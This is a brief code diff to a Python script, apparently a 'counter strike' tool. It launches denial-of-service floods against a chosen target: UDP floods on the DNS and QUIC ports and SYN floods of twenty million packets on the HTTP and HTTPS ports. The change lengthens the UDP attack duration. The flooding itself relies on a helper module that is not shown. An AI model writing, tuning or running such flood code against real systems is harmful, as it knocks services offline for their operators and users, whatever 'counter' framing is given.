@@ -4,8 +4,8 @@ import counter_strike_helper
 def full_scale_counter_strike(target):
     print("Full Counterstrike Initiated...")
     print("Performing UDP Attack")
-    counter_strike_helper.attack_UDP("UDP-Mix",target,53,300) # DNS
-    counter_strike_helper.attack_UDP("UDP-Mix", target, 443, 300) # QUIC
+    counter_strike_helper.attack_UDP("UDP-Mix",target,53,360) # DNS
+    counter_strike_helper.attack_UDP("UDP-Mix", target, 443, 360) # QUIC
     print("Performing SYN Flood")
     counter_strike_helper.synflood(target,80,20000000) # HTTP
     counter_strike_helper.synflood(target, 443, 20000000) # HTTPS
